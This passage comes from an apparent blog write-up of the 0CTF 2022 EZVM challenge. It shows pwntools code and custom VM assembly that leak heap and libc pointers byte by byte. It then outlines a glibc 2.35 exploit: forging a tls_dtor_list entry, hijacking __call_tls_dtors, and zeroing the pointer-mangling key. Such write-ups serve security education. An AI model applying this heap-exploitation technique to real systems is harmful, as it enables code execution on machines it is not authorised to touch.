<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your memory count:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">mem_count</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your code:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
<span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">finish!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">continue?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
<span class="k">return</span> <span class="n">out</span></code></pre></figure> <p>I then wrote assembly code that increments a counter from zero in a loop until it becomes equal to one byte of a pointer. In each loop, this program will hit a <code class="language-plaintext highlighter-rouge">nop</code> which will make the program print the string “what??”. And upon counting the number of these strings printed out, I can get the value of this one byte.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">mem_size</span><span class="p">,</span> <span class="n">num_bytes</span><span class="p">):</span>
<span class="n">leak_byte</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
lq r0 0
push r0
li r3 {byte_idx}
push r3
shr
pop r3
push r3
li r1 0xff
push r1
and
pop r1
li r2 0x1
.loop
push r1
push r2
sub
pop r1
push r1
jnz .loop
hlt
</span><span class="sh">"""</span>
<span class="n">leaked_bytes</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">num_bytes</span><span class="p">):</span>
<span class="n">prog</span> <span class="o">=</span> <span class="n">leak_byte</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">byte_idx</span><span class="o">=</span><span class="n">x</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">output</span> <span class="o">=</span> <span class="nf">run_vm</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">mem_size</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">leaked_byte</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">).</span><span class="nf">count</span><span class="p">(</span><span class="sh">"</span><span class="s">what???</span><span class="sh">"</span><span class="p">)</span>
<span class="n">leaked_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="n">leaked_byte</span><span class="p">]</span> <span class="o">+</span> <span class="n">leaked_bytes</span>

    <span class="n">leaked_addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">leaked_bytes</span><span class="p">:</span>
        <span class="n">leaked_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">leaked_addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">x</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Leaked value : </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">leaked_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">leaked_addr</span></code></pre></figure> <h2 id="step-7-the-target">Step 7: The Target</h2> <p>In the version of libc that the challenge uses (libc-2.35), the usual suspects for PC control such as <code class="language-plaintext highlighter-rouge">__free_hook</code> and <code class="language-plaintext highlighter-rouge">__malloc_hook</code> have been removed.</p> <p>But then there’s some code that always gets invoked when the program exits. Namely the <code class="language-plaintext highlighter-rouge">__run_exit_handlers()</code></p> <p>This function calls <code class="language-plaintext highlighter-rouge">__call_tls_dtors()</code> which walks a linked list called <code class="language-plaintext highlighter-rouge">tls_dtor_list</code> and executes the functions specified by each object’s function pointer.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/tls-480.webp 480w,/assets/img/ezvm/tls-800.webp 800w,/assets/img/ezvm/tls-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/tls.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Since we have an arbitrary overwrite, we can overwrite one entry in the linked list to point to an area we control. And with that, we can force the <code class="language-plaintext highlighter-rouge">__call_tls_dtors()</code> function to call a function pointer that we control.</p> <p>So then my plan for exploit was as follows</p> <ul> <li>Heap fengshui to get a heap pointer in the memory buffer</li> <li>Leak pointer to get heap leak</li> <li>Heap fengshui to get a libc pointer in the memory buffer</li> <li>Leak pointer to get libc leak</li> <li>Create fake <code>tls_dtor_list</code> object on heap</li> <li>Overwrite <code>tls_dtor_list</code> with the fake object</li> <li>????</li> <li>Profit</li> </ul> <p>We do have to take care of a pesky <code class="language-plaintext highlighter-rouge">PTR_DEMANGLE</code> macro which is basically a right shift followed by an xor. However, an easy way to fix it is to overwrite the xor key with 0.</p> <p>And putting it all together:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/pwned-480.webp 480w,/assets/img/ezvm/pwned-800.webp 800w,/assets/img/ezvm/pwned-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/pwned.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The final exploit is available here: <a href="/assets/python/ezvm/exploit.py">Exploit</a></p> <p>And the assembler is available here: <a href="/assets/python/ezvm/assembler.py">Assembler</a></p>]]></content><author><name></name></author><category term="writeup"/><category term="heap"/><category term="ctf"/><summary type="html"><![CDATA[Solving the EZVM challenge from 0CTF 2022]]></summary></entry></feed>